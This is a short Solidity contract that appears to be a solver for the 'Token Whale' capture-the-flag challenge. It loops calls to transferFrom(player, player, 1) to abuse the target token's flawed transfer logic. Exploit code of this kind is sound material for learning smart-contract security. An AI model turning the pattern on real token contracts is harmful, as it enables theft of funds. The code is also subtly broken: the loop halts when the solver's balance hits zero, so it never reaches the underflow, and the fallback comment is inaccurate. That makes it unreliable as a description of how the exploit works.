// SPDX-License-Identifier: MIT
pragma solidity ^0.4.21;

interface ITokenWhale {
    function transferFrom(address from, address to, uint256 value) external;
    function balanceOf(address user) external view returns (uint256);
}

contract TokenWhaleSolver {
    // Fallback needed to receive tokens in Solidity 0.4.21
    function () public payable { }

    function solve(address challengeAddress, address player) public {
        ITokenWhale token = ITokenWhale(challengeAddress);

        while (
            token.balanceOf(player) < 1000000 &&
            token.balanceOf(address(this)) > 0
        ) {
            token.transferFrom(player, player, 1);
        }
    }
}
